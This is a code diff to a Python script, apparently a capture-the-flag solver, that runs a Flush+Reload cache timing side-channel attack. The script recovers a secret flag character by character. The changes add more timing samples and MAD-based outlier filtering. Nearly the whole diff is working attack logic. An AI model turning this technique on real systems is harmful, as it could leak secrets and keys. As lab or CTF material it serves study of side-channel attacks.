@@ -1,14 +1,13 @@
 import statistics
 from concurrent.futures import ThreadPoolExecutor, as_completed
+
 from pyreload.run import get_time_from_run
 
-
 CHAR_SET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-NOISE_SAMPLES = 15  # 통계적 신뢰도를 위해 증가
+NOISE_SAMPLES = 30  # 통계적 신뢰도를 위해 증가
 MAX_LENGTH = 256  # 플래그의 최대 길이 설정
 
-
-def test_character(c, known_flag, delay):
+def test_character(c, known_flag, delay, max_samples):
     """
     단일 문자를 테스트하는 함수 (병렬 실행용)
     
@@ -23,7 +22,7 @@ def test_character(c, known_flag, delay):
     test_guess = known_flag + c
     time_measurements = []
     
-    for _ in range(NOISE_SAMPLES):
+    for _ in range(max_samples):
         result = get_time_from_run(test_guess, delay=delay)
         time_val, is_success = result
         
@@ -35,18 +34,26 @@ def test_character(c, known_flag, delay):
             return (c, None, False, 0)
         time_measurements.append(time_val)
     
-    # 이상값 제거: 상위/하위 20% 제거 후 평균 계산 (Trimmed Mean)
-    sorted_times = sorted(time_measurements)
-    trim_count = max(1, len(sorted_times) // 5)  # 20% 제거
-    trimmed_times = sorted_times[trim_count:-trim_count] if len(sorted_times) > 2 else sorted_times
+    # 이상값 제거: Modified Z-Score (MAD) 방식
+    # 중앙값 기반으로 더 robust한 이상치 제거
+    filtered_times = remove_outliers_mad(time_measurements, threshold=3.5)
     
-    reliable_time = statistics.mean(trimmed_times)
-    std_dev = statistics.stdev(trimmed_times) if len(trimmed_times) > 1 else 0
+    # 필터링 후 데이터가 너무 적으면 원본 사용
+    if len(filtered_times) < 3:
+        filtered_times = time_measurements
+    
+    reliable_time = statistics.mean(filtered_times)
+    std_dev = statistics.stdev(filtered_times) if len(filtered_times) > 1 else 0
     
     return (c, reliable_time, False, std_dev)
 
+def remove_outliers_mad(data, threshold=3.5):
+    median = statistics.median(data)
+    mad = statistics.median([abs(x - median) for x in data])
+    modified_z_scores = [0.6745 * (x - median) / mad for x in data]
+    return [x for i, x in enumerate(data) if abs(modified_z_scores[i]) <= threshold]
 
-def run_attack(delay, max_workers, max_retries_ref):
+def run_attack(delay, max_workers, max_retries_ref, max_samples):
     """
     병렬 처리를 사용한 Flush+Reload 공격
     
@@ -64,7 +71,7 @@ def run_attack(delay, max_workers, max_retries_ref):
         
         while retry_count <= max_retries:
             if retry_count > 0:
-                print(f"\n🔄 Retrying position {position + 1} (Attempt {retry_count + 1}/{max_retries + 1})...")
+                print(f"\n Retrying position {position + 1} (Attempt {retry_count + 1}/{max_retries + 1})...")
             else:
                 print(f"\n{'='*60}")
                 print(f"Position {position + 1}: Testing {len(CHAR_SET)} characters in parallel...")
@@ -74,7 +81,7 @@ def run_attack(delay, max_workers, max_retries_ref):
             with ThreadPoolExecutor(max_workers=max_workers) as executor:
                 # 모든 문자에 대한 작업 제출
                 futures = {
-                    executor.submit(test_character, c, known_flag, delay): c 
+                    executor.submit(test_character, c, known_flag, delay, max_samples): c 
                     for c in CHAR_SET
                 }
                 
@@ -88,7 +95,7 @@ def run_attack(delay, max_workers, max_retries_ref):
                     if is_success:
                         known_flag += char
                         print(f"\n\n{'='*60}")
-                        print(f"🎉 SUCCESS! Flag found: {known_flag}")
+                        print(f" SUCCESS! Flag found: {known_flag}")
                         print(f"{'='*60}")
                         return known_flag
                     
@@ -118,7 +125,7 @@ def run_attack(delay, max_workers, max_retries_ref):
                 # 경고: 차이가 3% 미만이면 불확실
                 if margin_ratio < 0.03:
                     confidence_ok = False
-                    print(f"\n⚠️  WARNING: Low confidence! Difference only {time_diff:.1f} ({margin_ratio*100:.1f}%)")
+                    print(f"\n  WARNING: Low confidence! Difference only {time_diff:.1f} ({margin_ratio*100:.1f}%)")
                     
                     if retry_count < max_retries:
                         print(f"   Retrying to get more reliable result...")
@@ -135,7 +142,7 @@ def run_attack(delay, max_workers, max_retries_ref):
         
         # 결과 출력
         print(f"\n✓ Found next char: '{best_char}' (Time: {best_time:.1f}, σ={best_std:.1f})")
-        print(f"📝 Current Flag: {known_flag}")
+        print(f" Current Flag: {known_flag}")
         
         # 상위 5개 후보 출력 (디버깅용)
         top_5 = sorted_results[:5]
